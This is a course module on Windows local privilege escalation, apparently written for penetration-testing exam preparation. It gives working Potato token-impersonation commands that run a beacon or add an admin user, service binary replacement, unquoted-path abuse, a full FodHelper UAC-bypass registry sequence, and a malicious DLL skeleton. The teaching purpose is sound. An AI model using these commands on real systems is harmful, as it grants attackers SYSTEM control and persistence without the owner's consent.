# Phase 07: Windows Privilege Escalation

> **Why this phase exists**: Local privesc is the bridge between "domain user with a shell" and "SYSTEM with credentials to dump." You need multiple techniques because you won't always know which one applies until you're on the box.

**Study time**: 2 weeks — there's a lot here and each technique needs practice
**Difficulty**: Intermediate

---

## Learning Objectives

- [ ] Explain why SeImpersonatePrivilege leads to SYSTEM and which Potato variant to use when
- [ ] Exploit a weak service binary permission in a lab
- [ ] Exploit an unquoted service path in a lab
- [ ] Bypass UAC when you're a local admin in medium integrity
- [ ] Exploit AlwaysInstallElevated
- [ ] Explain DLL hijacking and find DLL hijack opportunities

---

## 1. Potato Attacks — The Most Common Exam Path

### Why they work (the core mechanism)

Windows services that authenticate clients create **impersonation tokens** for those clients. If a SYSTEM-level service connects to *you*, you receive a SYSTEM impersonation token. With `SeImpersonatePrivilege`, you're allowed to use that token.

Potato attacks create a situation where SYSTEM authenticates to your controlled object (a named pipe, COM object, etc.) so you can steal the token.

### GodPotato (works on Windows Server 2012–2022, Windows 10/11)

**When to use**: You have `SeImpersonatePrivilege` on a modern Windows version. Use this first.

```cmd
# Get a reverse shell as SYSTEM
.\GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\beacon.exe"

# Add a local admin user
.\GodPotato-NET4.exe -cmd "cmd /c net user hacker P@ss123 /add & net localgroup administrators hacker /add"

# Verify it works (quick test)
.\GodPotato-NET4.exe -cmd "cmd /c whoami > C:\Windows\Temp\godtest.txt"
```

**Why "God"**: GodPotato uses the `EfsRpc` interface (a Windows Encrypting File System RPC call) to coerce a SYSTEM token. It's more reliable and has fewer version constraints than older Potatoes.

### SweetPotato (Windows 10/Server 2016–2019)

Uses a different COM activation path. Fallback when GodPotato fails.

```cmd
.\SweetPotato.exe -a "C:\Windows\Temp\beacon.exe"
.\SweetPotato.exe -e EfsRpc -p C:\Windows\Temp\beacon.exe
```

### PrintSpoofer (Server 2016/2019, Windows 10 — Print Spooler must be running)

```cmd
.\PrintSpoofer.exe -i -c cmd     # interactive cmd as SYSTEM
.\PrintSpoofer.exe -c "C:\Windows\Temp\beacon.exe"
```

### How to know which Potato to use

```
Check Windows version: systeminfo | findstr /B "OS"
Check if SeImpersonatePrivilege is enabled: whoami /priv
→ Server 2019/2022 or Windows 10/11: try GodPotato first
→ Older: try SweetPotato → PrintSpoofer
→ If Print Spooler is stopped: PrintSpoofer won't work
→ If EfsRpc is blocked: GodPotato may fail → try SweetPotato
```

---

## 2. Weak Service Binary Permissions

### The full exploitation flow

```
1. Find service with weak binary permissions
   → Get-WmiObject Win32_Service | Select Name,PathName,StartName
   → icacls "C:\path\to\service.exe" | findstr "Users\|Everyone\|BUILTIN"

2. Back up the original binary
   → copy "C:\path\service.exe" "C:\Windows\Temp\service_backup.exe"

3. Replace with your payload
   → copy C:\Windows\Temp\beacon.exe "C:\path\service.exe"

4. Restart the service
   → sc stop ServiceName
   → sc start ServiceName
   → (or wait for scheduled restart)

5. Catch the callback as SYSTEM
```

### Practice setup (build this in your lab)

```powershell
# Create a vulnerable service on your Windows lab VM
sc create VulnSvc binpath= "C:\Program Files\VulnApp\service.exe" start= auto
mkdir "C:\Program Files\VulnApp"
copy C:\Windows\System32\cmd.exe "C:\Program Files\VulnApp\service.exe"
# Make it world-writable:
icacls "C:\Program Files\VulnApp\service.exe" /grant Everyone:F
```

Now from a low-priv user account — try to exploit it.

---

## 3. Unquoted Service Paths

### Why this is easy to miss

The vulnerability isn't in the binary permissions — it's in how Windows *resolves* the path. A binary at `C:\Program Files\My App\service.exe` with strong permissions is still vulnerable if:
1. The path is unquoted
2. You can create a file at `C:\Program Files\My.exe` (requires write access to `C:\Program Files\`)

### Finding and exploiting

```powershell
# Find unquoted paths
Get-WmiObject Win32_Service | 
  Where-Object {$_.PathName -notmatch '^"' -and $_.PathName -match ' '} |
  Select Name, PathName, StartName

# Say you find: C:\Program Files\Vuln App\bin\service.exe
# Check if you can write to C:\Program Files\ or C:\Program Files\Vuln\
icacls "C:\Program Files\" | findstr "Users\|Everyone"
icacls "C:\Program Files\Vuln App\" | findstr "Users\|Everyone"

# If writable at "C:\Program Files\":
copy beacon.exe "C:\Program Files\Vuln.exe"   # Windows tries this first!
sc stop VulnSvc; sc start VulnSvc
```

---

## 4. UAC Bypass

### What UAC is (and isn't)

UAC is **not** a security boundary. Microsoft says so explicitly. It's a convenience feature to prevent accidental admin-level changes. Its purpose: make users confirm admin-level operations.

**When UAC affects you**: You're in a local admin account but running at **medium integrity**. You can see `Mandatory Label\Medium Mandatory Level` in `whoami /groups`. To do admin things (write to HKLM, access system files), you need to elevate to high integrity.

### Why FodHelper works

`fodhelper.exe` is a trusted Microsoft binary that runs with auto-elevation (it's allowed to elevate without a UAC prompt, because Microsoft trusts it). It reads a registry key in HKCU before launching — and HKCU is user-writable. Write your payload path into that key → `fodhelper.exe` launches it at high integrity.

```powershell
# Check your current integrity level
whoami /groups | findstr "Mandatory"
# Medium = UAC applicable

# FodHelper bypass
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "C:\Windows\Temp\beacon.exe" -Force
Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

### Other UAC bypass methods

- **Eventvwr**: Same concept, uses `HKCU:\Software\Classes\mscfile\shell\open\command`
- **cmstp**: Uses COM script processing to bypass UAC — more reliable on some versions
- **Mock Trusted Directories**: Create `C:\Windows \System32\` (note the space) — Windows' COM elevation checks can be fooled

**For the exam**: FodHelper first, Eventvwr as backup. Both work on Windows 10/11.

---

## 5. DLL Hijacking

### The mechanism

Windows searches for DLLs in a specific order (DLL search order). When an application tries to load a DLL, Windows checks:
1. The directory of the application
2. The system directory (System32)
3. Windows directory
4. Current directory
5. Directories in PATH

If an application tries to load a DLL that **doesn't exist** in the expected location, and you can write a file to a directory that's checked earlier — Windows loads your DLL as the application's identity.

### Finding DLL hijack opportunities

```powershell
# Use Process Monitor (Procmon from Sysinternals)
# Filter: Operation = "CreateFile" AND Path ends with ".dll" AND Result = "NAME NOT FOUND"
# This shows all DLLs an application is looking for but can't find

# Check if you can write to the application's directory
icacls "C:\Program Files\VulnApp\" | findstr "Users\|Everyone"
```

### Creating a malicious DLL

The DLL must export the functions the application expects. For proxy DLLs that replace a legitimate DLL, you need to forward all the real functions while also running your beacon.

```c
// Simple DLL that runs beacon on load
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Run beacon in a new thread
        HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_shellcode, NULL, 0, NULL);
    }
    return TRUE;
}
```

```bash
# Compile
x86_64-w64-mingw32-gcc -shared -o missing.dll malicious.c -lws2_32
```

---

## Practice Labs

| Lab | Platform | Focus |
|-----|---------|-------|
| [THM: Windows PrivEsc](https://tryhackme.com/room/windows10privesc) | THM (Sub) | All techniques guided |
| [THM: Steel Mountain](https://tryhackme.com/room/steelmountain) | THM (Sub) | Service vulnerability real box |
| [HTB: Devel](https://app.hackthebox.com/machines/Devel) | HTB (Free) | Token impersonation classic |
| [HTB: Optimum](https://app.hackthebox.com/machines/Optimum) | HTB (Free) | Windows privesc path |
| Manual: Build a vulnlab | Your lab | Create 5 different privesc scenarios, exploit each from scratch |

---

## Phase 07 Mastery Checklist

- [ ] Can you explain why `SeImpersonatePrivilege` leads to SYSTEM without googling?
- [ ] Can you run GodPotato and get a SYSTEM beacon in your lab?
- [ ] Can you exploit a weak service binary permission end-to-end?
- [ ] Can you exploit an unquoted service path end-to-end?
- [ ] Can you bypass UAC with FodHelper and confirm high integrity?
- [ ] Can you explain what DLL hijacking is and when it applies?
- [ ] Can you decide which privesc technique to use based on `whoami /priv` and `systeminfo` output?

---

## Next Phase → **Phase 08: Credential Access — How Windows Stores Secrets**
